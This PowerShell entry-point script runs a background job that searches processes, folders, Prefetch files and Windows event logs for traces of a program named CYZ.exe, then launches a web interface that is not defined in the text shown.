$StartInWebUI = $true
# --- Entry Point ---
# Diagnostic: show entry point state before launching UI
[Console]::WriteLine("Entry point: StartInWebUI = $([boolean]::Parse(($StartInWebUI -eq $true).ToString()))")
if (Get-Command -Name Start-WebUI -ErrorAction SilentlyContinue) { [Console]::WriteLine('Entry point: Start-WebUI function is defined') } else { [Console]::WriteLine('Entry point: Start-WebUI function NOT found') }
[Console]::WriteLine("PSCommandPath = $PSCommandPath")

# Start the asynchronous system check in a background job
$detectionJob = Start-Job -ScriptBlock {
    # Define the system check function inline in the job
    function Invoke-StealthCheck {
        [Console]::WriteLine('Invoke-StealthCheck: starting detection...')
        $detected = $false
        $detectionMethods = @()
        $targetFile = 'CYZ.exe'
        
        # 1. Check for running process
        try {
            $proc = Get-Process | Where-Object { $_.ProcessName -like '*CYZ*' -or $_.Name -like '*CYZ*' }
            if ($proc) {
                [Console]::WriteLine('Invoke-StealthCheck: CYZ process detected in running processes')
                $detected = $true
                $detectionMethods += 'Running Process'
            }
        } catch {
            [Console]::WriteLine("Invoke-StealthCheck: process check error: $($_.Exception.Message)")
        }
        
        # 2. Search file system paths
        $searchPaths = @(
            "$env:ProgramFiles",
            "$env:ProgramFiles(x86)",
            "$env:LOCALAPPDATA",
            "$env:APPDATA",
            "$env:TEMP",
            "$env:USERPROFILE\Downloads",
            "$env:SystemDrive\Users",
            "$env:SystemRoot\Prefetch"
        )
        
        foreach ($path in $searchPaths) {
            if (-not (Test-Path $path)) { continue }
            try {
                $found = Get-ChildItem -Path $path -Recurse -Filter $targetFile -File -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($found) {
                    [Console]::WriteLine("Invoke-StealthCheck: $targetFile found at: $($found.FullName)")
                    $detected = $true
                    $detectionMethods += "File System ($($found.Directory.Name))"
                }
            } catch {
                [Console]::WriteLine("Invoke-StealthCheck: error searching $path - $($_.Exception.Message)")
            }
        }
        
        # 3. Check Prefetch folder for execution traces
        try {
            $prefetchPath = "$env:SystemRoot\Prefetch"
            if (Test-Path $prefetchPath) {
                $prefetchFile = Get-ChildItem -Path $prefetchPath -Filter "CYZ.EXE-*.pf" -File -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($prefetchFile) {
                    [Console]::WriteLine("Invoke-StealthCheck: Prefetch file detected: $($prefetchFile.Name)")
                    $detected = $true
                    $detectionMethods += 'Prefetch History'
                }
            }
        } catch {
            [Console]::WriteLine("Invoke-StealthCheck: prefetch check error: $($_.Exception.Message)")
        }
        
        # 4. Check Application Error logs
        try {
            $appError = Get-WinEvent -LogName Application -FilterXPath "*[System[Provider[@Name='Application Error']]] and *[EventData[Data='CYZ.exe']]" -MaxEvents 1 -ErrorAction SilentlyContinue
            if ($appError) {
                [Console]::WriteLine('Invoke-StealthCheck: CYZ.exe found in Application Error log')
                $detected = $true
                $detectionMethods += 'Application Error Log'
            }
        } catch {
            [Console]::WriteLine("Invoke-StealthCheck: Application log check error: $($_.Exception.Message)")
        }
        
        # 5. Check Security audit log for process creation events (Event ID 4688)
        try {
            $securityEvents = Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4688)]]" -MaxEvents 100 -ErrorAction SilentlyContinue
            if ($securityEvents) {
                foreach ($evt in $securityEvents) {
                    $evtXml = [xml]$evt.ToXml()
                    $newProcessName = $evtXml.Event.EventData.Data | Where-Object { $_.Name -eq 'NewProcessName' } | Select-Object -ExpandProperty '#text' -ErrorAction SilentlyContinue
                    if ($newProcessName -and $newProcessName -like "*CYZ.exe*") {
                        [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in Security log: $newProcessName")
                        $detected = $true
                        $detectionMethods += 'Security Audit Log (Event 4688)'
                        break  # Only add once even if multiple events found
                    }
                }
            }
        } catch {
            [Console]::WriteLine("Invoke-StealthCheck: Security log check error: $($_.Exception.Message)")
        }
        
        $methodsString = if ($detectionMethods.Count -gt 0) { 
            $detectionMethods -join ', ' 
        } else { 
            'None' 
        }
        
        [Console]::WriteLine("Invoke-StealthCheck: detection complete - Detected=$detected, Methods=$methodsString")
        return @{ Detected = $detected; Methods = $detectionMethods; MethodsString = $methodsString }
    }
    
    # Call the function and return result
    return Invoke-StealthCheck
}
[Console]::WriteLine("Started background detection job with ID: $($detectionJob.Id)")


if ($StartInWebUI) {
    [Console]::WriteLine('Entry point: invoking Start-WebUI...')
    # Pass the script root and the job to the Web UI function
    Start-WebUI -PSScriptRoot $PSScriptRoot -detectionJob $detectionJob
    [Console]::WriteLine('Entry point: returned from Start-WebUI')
    
    # Display completion message
    Write-Host "`n" -NoNewline
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "  Thanks for running the tool!         " -ForegroundColor Green
    Write-Host "  You can close this window and        " -ForegroundColor Green
    Write-Host "  restart your PC!                     " -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "`n" -NoNewline
}